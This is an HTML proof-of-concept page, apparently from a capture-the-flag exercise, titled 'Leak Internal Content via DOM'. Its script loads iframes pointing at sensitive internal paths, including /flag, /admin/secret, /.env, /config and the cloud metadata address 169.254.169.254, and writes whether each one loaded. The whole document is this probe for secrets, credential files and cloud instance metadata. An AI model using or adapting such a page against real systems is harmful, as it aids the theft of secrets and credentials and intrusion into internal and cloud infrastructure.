<!DOCTYPE html>
<html>
  <head><meta charset="UTF-8"><title>DOM Leak PoC</title></head>
  <body>
    <h1>Leak Internal Content via DOM</h1>
    <div id="out"></div>

    <script>
      const paths = [
        "/flag",
        "/admin/secret",
        "/.env",
        "/config",
        "http://169.254.169.254/latest/meta-data/"
      ];

      const out = document.getElementById("out");

      for (const path of paths) {
        const iframe = document.createElement("iframe");
        iframe.src = path;
        iframe.width = 600;
        iframe.height = 200;
        iframe.onload = () => {
          out.innerHTML += `<h3>${path}</h3><p>Loaded (may or may not be visible)</p>`;
        };
        iframe.onerror = () => {
          out.innerHTML += `<h3>${path}</h3><p>Failed to load</p>`;
        };
        out.appendChild(iframe);
      }
    </script>
  </body>
</html>
